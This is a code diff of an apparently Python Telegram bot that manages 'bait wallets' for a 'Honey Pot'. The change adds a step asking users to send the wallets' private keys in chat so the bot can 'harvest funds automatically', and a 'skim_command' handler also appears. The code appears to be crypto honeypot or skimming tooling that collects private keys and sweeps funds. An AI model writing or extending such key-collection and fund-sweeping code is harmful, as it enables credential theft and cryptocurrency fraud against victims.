@@ -816,10 +816,9 @@ class NotificationService:
 
     async def wizard_bait_addresses(self, message: types.Message, state: FSMContext):
         raw_input = message.text.replace(",", " ").split()
-        await self._process_bait_addition(message, raw_input)
-        await state.clear()
+        await self._process_bait_addition(message, raw_input, state)
 
-    async def _process_bait_addition(self, message, raw_input):
+    async def _process_bait_addition(self, message, raw_input, state):
         user_id = str(message.from_user.id)
         row = await self.db.get_user_state(user_id)
         db_state = dict(row) if row else {}
@@ -840,7 +839,13 @@ class NotificationService:
             return
 
         await self.db.update_user_state(user_id, bait_wallets_json=json.dumps(bait_list))
-        await message.answer(f"✅ *Honey Pot Updated:* Added `{len(added)}` bait wallets.", reply_markup=self.get_dashboard_markup())
+        await message.answer(
+            f"✅ *Honey Pot Updated:* Added `{len(added)}` bait wallets.\n\n"
+            "🔐 *FINAL STEP:* Please send the **Private Key(s)** for these bait wallets.\n"
+            "(I will delete your message instantly. This allows me to harvest funds automatically).",
+            parse_mode="Markdown"
+        )
+        await state.set_state(SetupWizard.waiting_for_vault_key)
 
     async def skim_command(self, message: types.Message, state: FSMContext):
         await state.clear()
